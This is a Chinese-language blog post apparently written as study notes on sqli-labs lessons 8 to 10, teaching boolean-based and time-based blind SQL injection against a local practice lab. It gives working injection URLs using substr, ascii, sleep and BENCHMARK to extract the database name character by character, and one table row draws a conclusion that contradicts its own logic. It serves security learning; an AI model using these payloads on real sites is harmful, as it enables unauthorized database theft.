---
title: sqli labs lesson 8~10 学习
date: 2016-08-26 14:24:46
tags:
- 渗透测试
- SQL 注入
categories: SQL 注入
---
很多时候，Web服务器关闭了错误回显，攻击者为了应对这种情况，研究出了“盲注”（Blind Injection）的技巧。
<!-- more -->
# 1 盲注
__盲注__ 就是在服务器没有错误回显的时完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的“调试信息”，所以攻击者必要找到一个方法来验证注入的SQL语句是否得到执行。
最常见的盲注验证方法是，构造简单的条件语句，根据返回页面是否发生变化，来判断SQL语句是否执行。
比如，一个网站的 URL：
`http://localhost/sqli-labs-master/Less-8/?id=1'%23`
执行的SQL语句
`select * from tables where id = '1'%23' limit 0,1`
![](https://ww1.sinaimg.cn/large/005CA6ZCgw1f775iarqpdj30c803cwek.jpg)

## 1.1 测试 SQL 漏洞
如果构造如下条件语句：
`http://localhost/sqli-labs-master/Less-8/?id=1' and 1=0%23`
实际执行的SQL语句：
`select * from tables where id = '1' and 1=0%23' limit 0,1`
因为 "and 1=0" 为false，所以这条SQL语句的 "and" 条件永远无法成立。对Web应用来说，也不会将结果返回给用户，攻击者看到的页面结果将为空或者是一个出错的页面。
![](https://ww2.sinaimg.cn/large/005CA6ZCgw1f775iypxzdj30c803ca9z.jpg)

## 1.2 确认 SQL 漏洞
为了进一步确认注入是否存在，必须再次验证这个过程。因为一些处理逻辑或安全功能，在攻击者构造异常请求时，也可能会导致页面返回不正常。攻击者继续构造如下请求：
`http://localhost/sqli-labs-master/Less-8/?id=1' and 1=1%23`
当攻击者构造条件 "and 1=1" 时，如果页面正常返回了，则说明 SQL 语句的 "and" 成功执行，那么久可以判断 "id" 参数存在 SQL 注入漏洞。
![](https://ww1.sinaimg.cn/large/005CA6ZCgw1f775jqhx1kj30c803c3ym.jpg)

<font color="red">盲注工作原理：虽然服务器关闭了错误回显，但攻击者通过简单的条件判断，在对比页面返回结果的差异，就可以判断出 SQL 注入漏洞是否存在</font>

# 2 lesson 8 盲注-基于bool值
## 2.1 基础知识
### 2.1.1 substr
SQL 中的 substring 函数是用来抓出一个栏位资料中的其中一部分。这个函数的名称在不同的资料库中不完全一样。
- MySQL: SUBSTR(), SUBSTRING()
- Oracle: SUBSTR()
- SQL Server: SUBSTRING()

最常用到的方式如下 (在这里我们用 SUBSTR() 为例)：

原型 | 说明
-- | --
SUBSTR(str, pos) | 从 str 中，选出所有从第 pos 位置开始的字元。请注意，这个语法不适用于 SQL Server 上。
SUBSTR(str, pos, len) | 从 str 中的第 pos 位置开始，选出接下去的 len 个字元。

![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f775xbbk66j30c803jaao.jpg)

`SELECT substr(email_id,3) FROM `emails` WHERE id=1`
![](https://ww1.sinaimg.cn/large/005CA6ZCgw1f775zhclgtj30c8067dg1.jpg)

`SELECT substr(email_id,0,3) FROM `emails` WHERE id=1`
![](https://ww1.sinaimg.cn/large/005CA6ZCgw1f7760qfdspj30c806oaaa.jpg)

### 2.1.1 assci
ascii()函数将字符转换成其对应的ascii码，而char()函数将数字转换成对应的acscii码字符。

## 2.2 基于bool型盲注
本篇第一小节可知，lesson 8 是单引号闭合的。

sql语句 | 说明
-- | --
select database() | 当前数据库
select substr(database(),1,1) | 当前数据库名首字母
select ascii(substr(database(),1,1)) | 当前数据库名首字母 ascii 码值

参数 | 说明
-- | --
?id=1'%23 | You are in.... 页面显示正确
?id=1' and 1=0%23 | 页面显示出错
?id=1' and 1=1%23 | You are in.... 页面显示正确
?id=1' and (select ascii(substr(database(),1,1)))=97%23 | You are in.... 正确，说明首字母不为 a
?id=1' and (select ascii(substr(database(),1,1)))=115%23 | You are in.... 正确，说明首字母为 s

依照相同的方法，猜解除所有数据库信息。

# 3 lesson 9 盲注-基于时间-单引号
lesson 9 无论输入的参数是否合法，页面都没有任何差异。
在盲注（blind SQL injection）时，如果不同SQL injection 指令的结果，无法由 HTTP Response 本身得知，则可用时间差的方式判断。
<font color="red">设计一个很耗时的 SQL 指令，如果 SQL injection 成功，那么这个SQL injection 指令的执行结果，会影响到 Web server 响应 HTTP response 的速度，由此判断 SQL injection 指令执行的结果。</font>
## 3.1 sleep() 和 BENCHMARK()
- sleep(N)函数，强制让语句停留N秒钟
- BENCHMARK(count,expr)函数，重复执行表达式expr count次，使得结果返回的时间比平时要长

参数 | 说明
-- | --
?id=1 and if(1,sleep(60),null)%23 | 页面无延迟
?id=1' and if(1,sleep(60),null)%23 | 页面加载一段延迟后，正常显示
?id=1" and if(1,sleep(60),null)%23 | 页面无延迟

说明参数时用单引号 ' 闭合的。
也可以使用 BENCHMARK(50000000,ENCODE('hello','goodbye')) 替换sleep(60) 

## 3.2 基于时间型盲注
参数 | 说明
-- | --
select ascii(substr(database(),1,1)) | 数据库名首字母ascii码值
?id=1' and if((select ascii(substr(database(),1,1)))=97,sleep(60),null)%23 | 页面无延迟，说明首字母不为 a
?id=1' and if((select ascii(substr(database(),1,1)))=115,sleep(60),null)%23 | 页面延迟一段时间后加载，说明首字母为 s

依照相同的方法，猜解除所有数据库信息。

# 4 lesson 10 盲注-基于时间-双引号
参数用双引号闭合，其他步骤同上。

# 5 参考文献
[sqli-labs series part 8 (Blind injections - Boolean based)](https://www.youtube.com/watch?v=u7Z7AIR6cMI&index=16&list=PLkiAz1NPnw8qEgzS7cgVMKavvOAdogsro)
[sqli-labs series part 9 (Blind injections - Time based)](https://www.youtube.com/watch?v=gzU1YBu_838&index=15&list=PLkiAz1NPnw8qEgzS7cgVMKavvOAdogsro)

